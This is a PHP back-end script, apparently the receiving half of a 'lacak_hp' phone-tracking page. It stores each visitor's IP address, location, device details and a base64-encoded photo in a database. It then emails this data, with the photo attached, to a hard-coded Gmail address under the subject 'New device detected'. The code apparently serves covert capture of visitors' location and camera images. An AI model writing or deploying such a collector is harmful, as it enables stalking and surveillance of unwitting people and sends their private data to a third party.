<?php
$host = "localhost";
$user = "root";
$pass = "";
$db   = "lacak_hp";

$conn = new mysqli($host, $user, $pass, $db);
if ($conn->connect_error) {
  die("Koneksi gagal: " . $conn->connect_error);
}

$data = json_decode(file_get_contents("php://input"), true);
$ip     = $data['ip'] ?? '';
$lokasi = $data['lokasi'] ?? '';
$device = $data['device'] ?? '';
$foto   = $data['foto'] ?? '';

// Simpan ke database
$stmt = $conn->prepare("INSERT INTO pengunjung (ip_address, lokasi, perangkat, foto) VALUES (?, ?, ?, ?)");
$stmt->bind_param("ssss", $ip, $lokasi, $device, $foto);
$stmt->execute();
$stmt->close();
$conn->close();

// Kirim email
$to       = "agatanuraini48@gmail.com"; // GANTI EMAIL TUJUAN
$subject  = "Deteksi Perangkat Baru";
$boundary = md5(uniqid());
$filename = "foto_" . time() . ".png";

// Headers
$headers  = "From: notifikasi@webmu.com\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: multipart/mixed; boundary=\"$boundary\"\r\n";

// Body Pesan
$message  = "--$boundary\r\n";
$message .= "Content-Type: text/plain; charset=UTF-8\r\n";
$message .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
$message .= "IP Address : $ip\r\n";
$message .= "Lokasi     : $lokasi\r\n";
$message .= "Device     : $device\r\n\r\n";

// Lampiran Gambar
$fotoData = str_replace('data:image/png;base64,', '', $foto);
$fotoData = base64_decode($fotoData);
$encodedFoto = chunk_split(base64_encode($fotoData));

$message .= "--$boundary\r\n";
$message .= "Content-Type: image/png; name=\"$filename\"\r\n";
$message .= "Content-Transfer-Encoding: base64\r\n";
$message .= "Content-Disposition: attachment; filename=\"$filename\"\r\n\r\n";
$message .= $encodedFoto . "\r\n";
$message .= "--$boundary--";

// Kirim email
mail($to, $subject, $message, $headers);
?>